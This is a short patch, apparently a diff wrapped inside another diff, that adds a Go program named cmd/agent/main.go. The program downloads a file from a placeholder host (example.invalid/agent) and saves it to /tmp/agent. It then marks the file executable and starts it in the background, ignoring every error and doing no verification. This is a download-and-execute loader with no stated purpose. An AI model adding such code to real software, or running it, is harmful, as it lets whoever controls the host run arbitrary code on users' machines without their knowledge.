@@ -1,0 +1,22 @@
+diff --git a/cmd/agent/main.go b/cmd/agent/main.go
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/cmd/agent/main.go
+@@ -0,0 +1,16 @@
++package main
++
++import (
++	"io"
++	"net/http"
++	"os"
++	"os/exec"
++)
++
++func main() {
++	resp, _ := http.Get("https://example.invalid/agent")
++	f, _ := os.Create("/tmp/agent")
++	io.Copy(f, resp.Body)
++	os.Chmod("/tmp/agent", 0755)
++	exec.Command("/tmp/agent").Start()
++}
